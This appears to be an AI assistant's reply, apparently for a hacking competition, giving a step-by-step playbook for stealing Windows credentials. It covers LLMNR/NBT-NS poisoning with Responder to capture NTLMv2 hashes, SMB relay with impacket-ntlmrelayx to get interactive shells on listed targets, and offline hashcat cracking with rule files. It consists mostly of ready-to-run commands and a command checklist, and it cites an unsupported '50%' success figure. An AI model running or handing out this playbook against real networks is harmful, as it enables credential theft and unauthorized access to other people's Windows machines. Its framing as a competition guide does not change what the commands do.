To set up a **Network Credential Sniffer** (LLMNR/NBT-NS Poisoner) and an **SMB Relay** attack from your Kali machine, follow these steps. This is the most effective way to grab Windows passwords or shells without needing to exploit a specific software vulnerability.

### 1. The Tools: Installation

You need `Responder` for sniffing/poisoning and `Impacket` for the relaying portion. Most Kali builds have these, but here is the manual install to be sure:

```bash
# Update and install dependencies
sudo apt update
sudo apt install responder python3-impacket -y

```

---

### 2. Phase 1: Sniffing (LLMNR/NBT-NS Poisoning)

This will catch NTLMv2 hashes from any Windows machine on the network that tries to browse a non-existent file share.

**Step 1: Configure Responder**
Before running, ensure the SMB and HTTP servers are "On" in the config file (usually they are by default).
`sudo nano /etc/responder/Responder.conf`

**Step 2: Start the Sniffer**
Run this on your Kali interface (usually `eth0` or `tap0` in lab environments):

```bash
sudo responder -I eth0 -dwv

```

* **What happens:** When a user on the Windows server types `\\sewerss` (typo), your Kali box says "I am sewerss!" and the Windows box sends its hash to you.
* **The Loot:** Hashes are saved in `/usr/share/responder/logs/`.

---

### 3. Phase 2: SMB Relay (The "No-Crack" Shell)

If you don't want to spend hours cracking a password, you can **relay** the sniffed hash to another machine (like the "Armory" or "Fortress" boxes) to get an instant shell. **Note: SMB Signing must be disabled on the target for this to work.**

**Step 1: Disable SMB/HTTP in Responder**
You cannot relay if Responder is already "holding" the SMB port. Edit `/etc/responder/Responder.conf` and set:

* `SMB = Off`
* `HTTP = Off`

**Step 2: Create a Target List**
Create a file called `targets.txt` with the IPs of the Windows machines you want to gain access to.

**Step 3: Run the Relay**

```bash
# Start Responder to do the poisoning
sudo responder -I eth0 -dw

# In a second terminal, start the relay
impacket-ntlmrelayx -tf targets.txt -smb2support -i

```

* `-i`: This gives you an **interactive shell** (via telnet on 127.0.0.1) once a victim is caught.

---

### 4. Cracking the Hashes (Offline)

If you just want the plaintext password to use for RDP later, use `hashcat`.

```bash
# Example command to crack NTLMv2 hashes
hashcat -m 5600 /usr/share/responder/logs/SMB-NTLMv2-SSP-<IP>.txt /usr/share/wordlists/rockyou.txt

```

---

### 5. Summary Checklist for the Competition

| Task | Command |
| --- | --- |
| **Passive Sniffing** | `sudo responder -I eth0 -dwv` |
| **Relay for Shells** | `impacket-ntlmrelayx -tf targets.txt -smb2support` |
| **Check Hashes** | `ls /usr/share/responder/logs/` |
| **Crack Hashes** | `hashcat -m 5600 <hash_file> rockyou.txt` |

---

### HackerBOT Pro-Tip:

If you are on a busy network and `rockyou.txt` isn't working, the Blue Team is likely using a "Passphrase" or a "Complex Password" like `S3w3r$2026!`.

Instead of a basic dictionary attack, use **Rule-based attacks** in Hashcat. Adding `--rules-file=/usr/share/hashcat/rules/best64.rule` will automatically try common variations (adding "!" at the end, changing 'e' to '3', etc.), which increases your success rate by 50% in these competitions.
